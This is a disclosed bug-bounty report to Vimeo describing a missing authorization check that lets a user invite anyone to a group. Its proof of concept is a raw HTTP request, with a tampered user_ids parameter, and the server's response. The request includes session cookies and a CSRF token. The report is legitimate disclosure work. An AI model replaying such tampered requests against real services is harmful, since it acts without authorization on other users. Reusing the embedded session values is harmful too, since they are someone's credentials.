# Invite any user to your group without even following him

## Report Details
- **Report ID**: 52707
- **URL**: https://hackerone.com/reports/52707
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2015-03-20T07:07:19.064Z
- **Disclosed**: 2016-08-25T22:59:21.853Z

## Reporter
- **Username**: indoappsec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: vimeo

## Vulnerability Information
Hi,

I can invite any user on vimeo.com to my group without even following him.

Request :

POST /groups/303339 HTTP/1.0
Host: vimeo.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0
Accept: text/javascript, text/html, application/xml, text/xml, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Referer: https://vimeo.com/groups/303339
Content-Length: 148
Cookie: vuid=1508464746.1333941254; __utma=18302654.119544349.1426737086.1426737086.1426737086.2; __utmc=18302654; __utmz=18302654.1426737086.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmv=18302654.|2=user_type=basic=1^3=ms=0=1^7=video_count=0=1^10=vuid=1508464746.1333941254=1; has_logged_in=1; stats_start_date=2015%2F03%2F15; stats_end_date=2015%2F03%2F19; __gads=ID=c9339811dfc88470:T=1426737131:S=ALNI_MZDCrEc2e-pl3FH439sQhwleaJtWQ; site_settings=%7B%22sticky_page%22%3A%22%5C%2Fmyvideos%22%2C%22browse_format_vid%22%3A%22video%22%7D; player=""; _abexps=%7B%2246%22%3A%22%22%7D; auto_load_stats=1; stream_id=Y2xpcHM6Mzg0NzcwMDM6aWQ6ZGVzYzpbXQ%3D%3D; stream_pos=1; __utmb=18302654.42.9.1426782866725; vimeo=epkmdrrssk70pcdx9rmxrtx7jpcdx9rmxrtx7%2Cpxux2vsdtxss0tf05kmcm5fv2fx9v0c5vkfkc5fm0; vimeo_player=eypkmdrrssk70pcdx9rmxrtx7jpcdx9rmxrtx7%2Cpcc9xcrfrv92stm0duwkvs9wrcmmv9scmvu2rdw9k; clips=9860371; __utmli=fg_group_share; xsrft=16bac65d57680f30d28df91452be51f8.d233e8fa090465217a917c2b74e7645e
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

action=send_message&user_ids=37857677&user_emails=&message=&token=16bac65d57680f30d28df91452be51f8.d233e8fa090465217a917c2b74e7645e&collection_type=

Vulnerable parameter : user_id . Just change the user ID and put any user ID .It will work.
Privilege escalation is on this request which doesn't check where you are following the user(user_id) or not.

Response :

HTTP/1.0 200 OK
Date: Thu, 19 Mar 2015 16:36:44 GMT
Server: nginx
Content-Type: text/html; charset=UTF-8
Expires: Thu, 19 Mar 2015 04:36:44 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=edge
X-Frame-Options: sameorigin
Content-Security-Policy-Report-Only: default-src https: data: 'unsafe-inline' 'unsafe-eval'; report-uri /_csp
Content-Length: 3376
Accept-Ranges: bytes
Via: 1.1 varnish
X-Served-By: cache-lax1426-LAX
X-Cache: MISS
X-Cache-Hits: 0
X-Timer: S1426783004.523786,VS0,VE173
Vary: User-Agent,Accept-Encoding
Set-Cookie: xsrft=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=/; domain=.vimeo.com
Keep-Alive: timeout=10, max=50
Connection: Keep-Alive


Kindly Fix the issue ASAP.

Thanks !

 



## Attachments
No attachments
